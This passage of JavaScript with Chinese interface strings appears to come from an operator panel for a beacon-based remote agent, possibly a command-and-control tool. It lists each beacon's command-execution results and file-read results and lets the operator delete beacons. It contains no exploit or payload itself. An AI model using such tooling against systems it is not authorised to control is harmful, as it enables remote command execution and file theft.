    event.preventDefault();
    const form = new FormData(event.target);
    try {
      const data = await api("/api/lite/results?beacon=" + encodeURIComponent(form.get("beaconId")));
      const lines = (data.Results || []).map((r) => {
        const stamp = r.At ? new Date(r.At).toLocaleString() : "";
        if (r.Kind === "exec") return `[${stamp}] 任务${r.TaskID} 退出码 ${r.Exit}\n${textOf(r.Output)}`;
        const errs = ["成功", "文件不存在", "没有权限", "文件太大"];
        return `[${stamp}] 任务${r.TaskID} 读文件 ${errs[r.Err] || "错误" + r.Err}\n${r.Err ? "" : textOf(r.Output)}`;
      });
      $("lite-results").textContent = lines.join("\n") || "没有新结果";
    } catch (err) { $("lite-results").textContent = err.message; }
  };
  view.querySelectorAll("[data-del]").forEach((button) => button.onclick = async () => {
    try {
      await api("/api/lite/beacon/delete", { method: "POST", json: { id: button.dataset.del } });
    } catch (err) {
      $("lite-note").textContent = "删除失败：" + err.message;
      return;
    }
    render();
  });
}

function whenISO(v) {
  if (!v) return "—";
  const d = new Date(v);
  return isNaN(d) ? "—" : d.toLocaleString();
}

boot();
